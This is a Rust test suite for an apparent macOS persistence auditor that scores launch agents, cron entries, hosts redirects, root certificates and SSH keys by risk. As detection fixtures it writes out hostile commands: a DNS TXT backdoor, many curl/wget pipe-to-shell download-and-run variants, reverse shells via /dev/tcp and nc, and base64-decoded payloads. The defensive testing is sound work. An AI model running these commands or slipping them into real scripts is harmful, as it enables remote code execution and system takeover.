use driftwatch::collect::btm;
use driftwatch::explain::{explain, field_label};
use driftwatch::Item;
use std::collections::BTreeMap;

fn item(category: &str, key: &str, fields: &[(&str, &str)]) -> Item {
    let fields: BTreeMap<String, String> = fields
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    Item::new(category, key, fields)
}

#[test]
fn flags_the_dns_txt_backdoor_as_high() {
    let e = explain(&item(
        "launchd",
        "/Users/me/Library/LaunchAgents/prodbackserv.com.plist",
        &[
            ("Label", "prodbackserv.com"),
            (
                "ProgramArguments",
                "/bin/bash -c curl -s $(dig +short TXT prodbackserv.com @8.8.8.8 | tr -d '\"') | osascript -l JavaScript",
            ),
            ("RunAtLoad", "true"),
            ("KeepAlive", "true"),
            ("scope", "user agent"),
        ],
    ));
    assert_eq!(e.title, "prodbackserv.com");
    assert_eq!(e.risk, "high");
    assert!(e.risk_reason.is_some());
    assert!(e
        .summary
        .starts_with("Starts a program every time you log in. It runs: /bin/bash"));
    assert_eq!(e.added_by, None);
    assert_eq!(e.confidence, None);
}

#[test]
fn btm_entry_for_the_backdoor_uses_its_label_not_bash() {
    let text = " Records for UID 501 : X\n\n #1:\n                 Name: bash\n                 Type: legacy agent (0x10008)\n           Identifier: 8.prodbackserv.com\n      Executable Path: /bin/bash\n                  URL: /Users/501/Library/LaunchAgents/prodbackserv.com.plist\n\n #2:\n                 Type: developer (0x20)\n           Identifier: Unknown Developer\n";
    let items = btm::parse(text);
    assert_eq!(explain(&items[0]).title, "prodbackserv.com");
    assert_eq!(explain(&items[1]).title, "Unknown Developer");
}

#[test]
fn google_updater_is_low_and_attributed() {
    let e = explain(&item(
        "launchd",
        "/Library/LaunchAgents/com.google.keystone.agent.plist",
        &[
            ("Label", "com.google.keystone.agent"),
            (
                "ProgramArguments",
                "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent -runMode ifneeded",
            ),
            ("RunAtLoad", "true"),
            ("scope", "global agent"),
        ],
    ));
    assert_eq!(e.risk, "low");
    assert_eq!(e.risk_reason, None);
    assert_eq!(e.added_by.as_deref(), Some("Google"));
    assert_eq!(e.confidence, Some("likely"));
}

#[test]
fn team_id_in_catalog_is_known() {
    let mut i = item(
        "apps",
        "/Applications/Zoom.us.app",
        &[("team_id", "BJ4HAAB9B3")],
    );
    i.team_id = Some("BJ4HAAB9B3".into());
    let e = explain(&i);
    assert_eq!(e.title, "Zoom.us");
    assert_eq!(e.added_by.as_deref(), Some("Zoom"));
    assert_eq!(e.confidence, Some("known"));
}

#[test]
fn app_path_in_program_is_likely() {
    let e = explain(&item(
        "launchd",
        "/Library/LaunchAgents/x.plist",
        &[
            ("Label", "x.helper"),
            (
                "Program",
                "/Applications/Some Tool.app/Contents/MacOS/helper",
            ),
        ],
    ));
    assert_eq!(e.added_by.as_deref(), Some("Some Tool"));
    assert_eq!(e.confidence, Some("likely"));
}

#[test]
fn unknown_daemon_is_medium() {
    let e = explain(&item(
        "launchd",
        "/Library/LaunchDaemons/a.plist",
        &[
            ("Label", "a"),
            ("Program", "/usr/local/bin/a"),
            ("scope", "global daemon"),
        ],
    ));
    assert_eq!(e.risk, "medium");
    assert!(e.summary.contains("as the system"));
}

#[test]
fn tcc_camera_grant_reads_plainly() {
    let e = explain(&item(
        "tcc",
        "user: kTCCServiceCamera us.zoom.xos (type 0)",
        &[
            ("service", "kTCCServiceCamera"),
            ("client", "us.zoom.xos"),
            ("client_type", "0"),
            ("auth_value", "2"),
            ("scope", "user"),
        ],
    ));
    assert_eq!(e.title, "xos can use your camera");
    assert_eq!(e.risk, "low");
    assert_eq!(e.added_by.as_deref(), Some("Zoom"));

    let all_files = explain(&item(
        "tcc",
        "k",
        &[
            ("service", "kTCCServiceSystemPolicyAllFiles"),
            ("client", "/usr/libexec/sshd-keygen-wrapper"),
            ("auth_value", "2"),
        ],
    ));
    assert_eq!(
        all_files.title,
        "sshd-keygen-wrapper can read all your files"
    );
    assert_eq!(all_files.risk, "medium");
}

#[test]
fn hosts_redirect_of_known_domain_is_high_but_blocking_is_not() {
    let redirect = explain(&item("network", "hosts: 6.6.6.6 www.apple.com", &[]));
    assert_eq!(redirect.title, "www.apple.com → 6.6.6.6");
    assert_eq!(redirect.risk, "high");
    let block = explain(&item("network", "hosts: 0.0.0.0 ads.google.com", &[]));
    assert_eq!(block.risk, "low");
    let local = explain(&item("network", "hosts: 127.0.0.1 localhost", &[]));
    assert_eq!(local.title, "localhost → 127.0.0.1");
}

#[test]
fn root_trusted_cert_and_authorized_key_are_high() {
    let cert = explain(&item(
        "certs",
        "login AAAA",
        &[
            ("label", "Example Proxy CA"),
            (
                "trust",
                "user: Result Type : kSecTrustSettingsResultTrustAsRoot",
            ),
        ],
    ));
    assert_eq!(cert.title, "Example Proxy CA");
    assert_eq!(cert.risk, "high");

    let key = explain(&item(
        "ssh",
        "/Users/me/.ssh/authorized_keys: ssh-ed25519 0123456789abcdef",
        &[("type", "ssh-ed25519"), ("comment", "eve@laptop")],
    ));
    assert_eq!(key.title, "Remote login key (eve@laptop)");
    assert_eq!(key.risk, "high");
}

#[test]
fn base64_cron_job_is_high() {
    let e = explain(&item(
        "cron",
        "* * * * * echo aGk= | base64 -d | sh",
        &[("source", "user crontab")],
    ));
    assert_eq!(e.risk, "high");
}

fn agent(args: &str) -> Item {
    item(
        "launchd",
        "/Users/me/Library/LaunchAgents/x.plist",
        &[
            ("Label", "x"),
            ("ProgramArguments", args),
            ("scope", "user agent"),
        ],
    )
}

#[test]
fn download_and_run_variants_are_high() {
    for args in [
        "/usr/bin/python3 -c import urllib.request as u;exec(u.urlopen('http://x.example/p').read())",
        "/bin/sh -c curl -fsSL https://x.example/i | sudo bash",
        "/bin/sh -c curl -fsSL https://x.example/i | /usr/bin/env -i bash -s",
        "/bin/sh -c curl -s https://x.example/i | xargs -0 zsh -c",
        "/bin/sh -c \"$(curl -fsSL https://x.example/i)\"",
        "/bin/bash -c bash <(curl https://x.example/i)",
        "/bin/zsh -c eval `wget -qO- https://x.example/i`",
        "/bin/sh -c curl -o /tmp/x https://x.example/i && sh /tmp/x",
        "/bin/sh -c wget -O /tmp/x https://x.example/i; chmod +x /tmp/x; /tmp/x",
        "/usr/bin/osascript -e do shell script \"curl -s http://x.example/p -o /tmp/p\"",
        "/usr/bin/perl -MLWP::Simple -e eval get('http://x.example/p')",
        "/usr/bin/python3.11 -c import requests;exec(requests.get('http://x').text)",
        "/bin/bash -c bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
        "/usr/bin/nc 203.0.113.5 4444 -e /bin/sh",
        "/bin/sh -c echo Y3VybCB4IHwgc2g= | base64 --decode | sh",
        "/bin/sh -c sh -c \"$(echo Y3VybCB4IHwgc2g= | base64 -D)\"",
    ] {
        let e = explain(&agent(args));
        assert_eq!(e.risk, "high", "{args}");
        assert!(e.risk_reason.is_some(), "{args}");
    }
}

#[test]
fn btm_only_item_that_downloads_and_runs_is_high() {
    let e = explain(&item(
        "btm",
        "uid 501: 8.evil",
        &[
            ("type", "legacy agent (0x10008)"),
            ("executable", "/bin/sh -c curl -s http://x.example/p | sh"),
            ("url", "/Users/501/Library/LaunchAgents/evil.plist"),
            ("developer", "Some Dev"),
        ],
    ));
    assert_eq!(e.risk, "high");
}

#[test]
fn fetch_or_dns_lookup_alone_is_not_high() {
    for args in [
        "/bin/sh -c curl -fsS -m 10 https://hc-ping.com/abc",
        "/usr/bin/sdig +short TXT example.com | sh",
        "/bin/sh -c dig +short example.com > out.txt",
        "/bin/sh -c echo $(hostname) | sh",
        "/bin/sh -c sync && launchctl list; sh /usr/local/bin/after.sh",
    ] {
        assert_ne!(explain(&agent(args)).risk, "high", "{args}");
    }
}

#[test]
fn legit_updaters_are_not_high() {
    let google = explain(&agent(
        "/Users/me/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater --wake-all --enable-logging --vmodule=*/components/update_client/*=2,*/chrome/updater/*=2",
    ));
    assert_ne!(google.risk, "high");
    let adobe = explain(&agent(
        "/Applications/Utilities/Adobe Creative Cloud Experience/CCXProcess/CCXProcess.app/Contents/MacOS/CCXProcess --openAtBoot",
    ));
    assert_ne!(adobe.risk, "high");
    let items = btm::parse(include_str!("fixtures/sfltool-dumpbtm.txt"));
    assert!(items.iter().all(|i| explain(i).risk != "high"));
}

#[test]
fn program_in_a_temp_shared_or_hidden_folder_is_at_least_medium() {
    for (category, field, path) in [
        ("launchd", "Program", "/tmp/update"),
        ("launchd", "Program", "/private/tmp/update"),
        (
            "launchd",
            "ProgramArguments",
            "/Users/Shared/.x/agent --run",
        ),
        (
            "launchd",
            "ProgramArguments",
            "/usr/bin/python3 -u /Users/me/.cache/x.py",
        ),
        ("btm", "executable", "/Users/501/.local/bin/helper"),
        ("btm", "url", "file:///Users/Shared/Helper.app/"),
    ] {
        let mut i = item(category, "k", &[(field, path)]);
        i.team_id = Some("EQHXZ8M8AV".into());
        let e = explain(&i);
        assert_eq!(e.risk, "medium", "{path}");
        assert!(e.risk_reason.unwrap().contains("folder"), "{path}");
    }
    let mut ok = item("launchd", "k", &[("Program", "/Users/me/bin/tool")]);
    ok.team_id = Some("EQHXZ8M8AV".into());
    assert_eq!(explain(&ok).risk, "low");
}

#[test]
fn field_labels_fall_back_to_the_raw_name() {
    assert_eq!(field_label("ProgramArguments"), "What it runs");
    assert_eq!(field_label("file_sha256"), "File contents");
    assert_eq!(field_label("something_new"), "something_new");
}
